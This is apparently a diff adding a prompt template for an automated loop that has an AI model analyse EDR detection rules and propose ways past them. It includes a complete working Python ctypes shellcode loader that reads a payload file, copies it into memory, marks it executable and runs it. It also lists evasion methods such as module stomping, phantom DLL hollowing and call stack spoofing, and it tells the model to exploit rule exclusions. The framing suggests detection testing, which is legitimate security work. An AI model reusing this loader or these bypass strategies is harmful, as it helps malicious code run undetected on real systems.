@@ -1,0 +1,196 @@
+
+    # EDR Rule Gap Analysis
+    
+    ## Context
+    We are analyzing EDR detection rules to identify logical gaps and design improvements.
+    A test executable triggered alerts or failed validation. We need to understand each rule's logic, identify exceptions/exclusions, and propose precision improvements.
+    
+    ## Memory & History
+    ### Iteration History
+    Iter 1: [outcome=detected]
+Technique: unknown_approach (Standard implementation)
+Triggered Rules: Malicious Behavior Prevention Alert: Shellcode Execution via Python Script
+Analysis: Pending AI Analysis
+    
+    ### Rule Analysis
+    
+    Solved Rules: 
+    Persistent Rules: 
+    Active Rules Details:
+    
+    
+    
+    ### Active Approach Status
+    unknown_approach: 1/3 attempts (target: Malicious Behavior Prevention Alert: Shellcode Execution via Python Script)
+        
+    
+    
+    
+    ## Previous Test Results
+    Iteration: 1
+    Status: detected
+    Exit Code: 1
+    Output Snippet: 
+    Error Snippet: Process crashed with exit code 1 (0x00000001)
+    Compile Success: True
+    Previous Strategy Plan:
+    N/A
+
+    ## Previous Code (Python script that was tested)
+    ```python
+    import sys
+import ctypes
+from ctypes import wintypes
+
+# Extend wintypes for 64-bit compatibility to prevent AttributeError
+# These types are crucial for ensuring pointers and sizes are handled correctly on x64.
+wintypes.ULONGLONG = ctypes.c_ulonglong
+wintypes.SIZE_T = ctypes.c_size_t
+wintypes.LPDWORD = ctypes.POINTER(wintypes.DWORD)
+wintypes.LPVOID = ctypes.c_void_p
+
+# Windows API definitions with explicit argtypes and restypes for 64-bit safety
+kernel32 = ctypes.WinDLL('kernel32', use_last_error=True)
+
+# VirtualAlloc: Reserves, commits, or changes the state of a region of pages in the virtual address space.
+VirtualAlloc = kernel32.VirtualAlloc
+VirtualAlloc.argtypes = [wintypes.LPVOID, wintypes.SIZE_T, wintypes.DWORD, wintypes.DWORD]
+VirtualAlloc.restype = wintypes.LPVOID
+
+# VirtualProtect: Changes the protection on a region of committed pages in the virtual address space.
+VirtualProtect = kernel32.VirtualProtect
+VirtualProtect.argtypes = [wintypes.LPVOID, wintypes.SIZE_T, wintypes.DWORD, wintypes.LPDWORD]
+VirtualProtect.restype = wintypes.BOOL
+
+# VirtualFree: Releases, decommits, or releases and decommits a region of pages within the virtual address space.
+VirtualFree = kernel32.VirtualFree
+VirtualFree.argtypes = [wintypes.LPVOID, wintypes.SIZE_T, wintypes.DWORD]
+VirtualFree.restype = wintypes.BOOL
+
+# Constants for memory allocation and protection
+MEM_COMMIT = 0x1000
+MEM_RESERVE = 0x2000
+MEM_RELEASE = 0x8000
+PAGE_READWRITE = 0x04
+PAGE_EXECUTE_READ = 0x20
+
+def main():    
+    if len(sys.argv) < 2:
+        print(f"Usage: {{sys.argv[0]}} <path_to_shellcode.bin>")
+        sys.exit(1)
+    
+    shellcode_path = sys.argv[1]
+    try:
+        with open(shellcode_path, 'rb') as f:
+            payload = f.read()
+    except FileNotFoundError:
+        print(f"Error: File not found at '{{shellcode_path}}'")
+        sys.exit(1)
+    except Exception as e:
+        print(f"An error occurred while reading the file: {{e}}")
+        sys.exit(1)
+
+    payload_len = len(payload)
+    if payload_len == 0:
+        print("Error: Shellcode file is empty.")
+        sys.exit(1)
+
+    # 1. Allocate memory with PAGE_READWRITE permissions. This is less suspicious than RWX.
+    # We cast None to c_void_p for clarity, although it's not strictly required.
+    exec_mem = VirtualAlloc(ctypes.c_void_p(0), payload_len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE)
+    if not exec_mem:
+        print(f"Error: VirtualAlloc failed with code {{ctypes.get_last_error()}}")
+        sys.exit(1)
+
+    # 2. Copy the shellcode into the allocated memory.
+    # from_buffer_copy is used to safely copy the bytes into a ctypes array.
+    buffer = (ctypes.c_ubyte * payload_len).from_buffer_copy(payload)
+    ctypes.memmove(ctypes.c_void_p(exec_mem), buffer, payload_len)
+    
+    # 3. Change memory protection to PAGE_EXECUTE_READ.
+    # This makes the memory executable.
+    old_protect = wintypes.DWORD(0)
+    # Explicitly cast exec_mem to c_void_p to ensure correct pointer handling on x64
+    protect_res = VirtualProtect(ctypes.c_void_p(exec_mem), payload_len, PAGE_EXECUTE_READ, ctypes.byref(old_protect))
+    if not protect_res:
+        print(f"Error: VirtualProtect failed with code {{ctypes.get_last_error()}}")
+        VirtualFree(ctypes.c_void_p(exec_mem), 0, MEM_RELEASE)
+        sys.exit(1)
+
+    # 4. Create a function pointer to the shellcode and execute it.
+    # CFUNCTYPE defines the function signature. The first argument is the return type (None for void).
+    shellcode_func = ctypes.CFUNCTYPE(None)(exec_mem)
+    shellcode_func()
+    
+    # 5. Clean up the allocated memory.
+    free_res = VirtualFree(ctypes.c_void_p(exec_mem), 0, MEM_RELEASE)
+    if not free_res:
+        # This error is less critical as the payload has already run, but it's good practice to check.
+        print(f"Warning: VirtualFree failed with code {{ctypes.get_last_error()}}")
+
+    return 0
+
+if __name__ == "__main__":
+    main()
+    ```
+    
+    
+    ## Task
+    1. **Analyze** the execution failure or detection alert using the provided telemetry
+    2. **Per-Rule Analysis**: For EACH triggered detection rule (or previously triggered rule), perform individual gap analysis:
+    - Identify the rule's detection logic and scope
+    - **Priority 1**: Examine the rule's exclusion/exception conditions (check "Active Rules Details" if available)
+    - **Priority 2**: Find gaps in the current technique's implementation that could bypass this specific rule
+    - **Priority 3**: If no gap exists within the current technique, propose alternative approaches
+    3. **Design** next validation strategy focusing on rule gaps, NOT just evasion
+        
+    ## Exclusion Strategy Constraints
+    When analyzing Known_Exclusions, adhere to these rules:
+    - **Ignore `process.executable`**: The loader's filename and filepath cannot be modified, so do not propose exclusions based on them.
+    - **Ignore `code_signature`**: Signatures cannot be applied, so do not propose exclusions based on trusted signers.
+    - **Notable Exclusions**: **Stack-based** (e.g., call stack modules) and **API-based** exclusions.
+
+    ## Example of Analysis Logic
+    When analyzing a detection rule, identify conditions that can be neutralized by altering specific parameters. For instance:
+
+    - **Regex Constraints**: If a rule filters `process.Ext.api.metadata.target_address_path` with a regex like `c:\\windows\\(system32|syswow64)\\[a-z]+.dll`, using a DLL from a different directory (e.g., `C:\\Program Files\\...`) would serve as a bypass technique.
+
+    - **Allowlists**: If there is an exclusion list (`NOT LIKE`) for specific paths such as:
+      - `c:\\windows\\assembly\\nativeimages_*.dll`
+      - `c:\\program files\\*`
+      The detection can be evaded by ensuring the `call_stack` (e.g., via call stack spoofing or API proxying) or module path (e.g., Module Stomping a DLL loaded from that allowed path) aligns with these allowed paths.
+
+    **Requirements for Prompt Construction:**
+    Generalization: Do not fixate only on the examples provided above. The model should flexibly identify "Allowlists" or "Excluded Conditions" within any given rule and prioritize satisfying those exclusions.
+
+    ## Standard Testing Methodologies
+    - **rwx_allocation**: Allocate memory with PAGE_EXECUTE_READWRITE (RWX) permissions directly. The simplest and most straightforward method of running shellcode.
+    - **RW_to_RX**: Allocate as PAGE_READWRITE, write shellcode, then VirtualProtect to PAGE_EXECUTE_READ. Avoids suspicious RWX permissions.
+    - **module_stomping**: Load legitimate DLL (ex: mshtml.dll, edgehtml.dll. NOT kernel32.dll), locate executable section, overwrite with shellcode. Uses existing executable memory.
+    - **heap_execution**: Use HeapCreate + HeapAlloc instead of VirtualAlloc. Less commonly monitored by EDR.
+    - **fiber_execution**: Use Windows Fiber API (ConvertThreadToFiber, CreateFiber) to execute shellcode in fiber context.
+    - **phantom_dll_hollowing**: Map DLL as SEC_IMAGE_NO_EXECUTE, modify in memory, then remap sections as executable. Advanced evasion.
+    - **thread_stack_spoofing**: Overwrite the return address on the stack or use synthetic frames to hide the true origin of the execution (e.g., hiding the pointer to unbacked memory).
+    
+    ## Language Specific Constraints
+    - Ensure 64-bit compatibility. The shellcode is x64. When using ctypes on 64-bit Windows, you MUST explicitly define `.argtypes` and `.restype` (e.g., `ctypes.wintypes.HMODULE`, `ctypes.c_void_p`) for all Windows APIs to prevent 64-bit pointers from being truncated to 32-bit integers.
+    - Always cast memory addresses to `ctypes.c_void_p()` before passing them to Windows APIs like `VirtualProtect` to avoid pointer truncation.
+    - Do not print raw bytes or parsed memory strings (like PE section names) to the console to avoid UnicodeEncodeError on Windows.
+    
+    ## Output Format
+    For Rule: [Rule Name 1]
+    
+    - **Detection_Logic**: [How this rule identifies threats - be specific about monitored APIs, memory types, etc.]
+    - **Known_Exclusions**: [List any exception conditions from "Active Rules Details" or common EDR patterns]
+    - **Gap_Detail**: [Specific weakness in rule logic or current implementation]
+    - **Bypass_Strategy**: [How to exploit this gap - prefer same technique modification over new technique]
+
+    For Rule: [Rule Name 1]
+
+    - **Detection_Logic**: [How this rule identifies threats - be specific about monitored APIs, memory types, etc.]
+    - **Known_Exclusions**: [List any exception conditions from "Active Rules Details" or common EDR patterns]
+    - **Gap_Detail**: [Specific weakness in rule logic or current implementation]
+    - **Bypass_Strategy**: [How to exploit this gap - prefer same technique modification over new technique]
+
+    [Repeat for each triggered rule]
+    
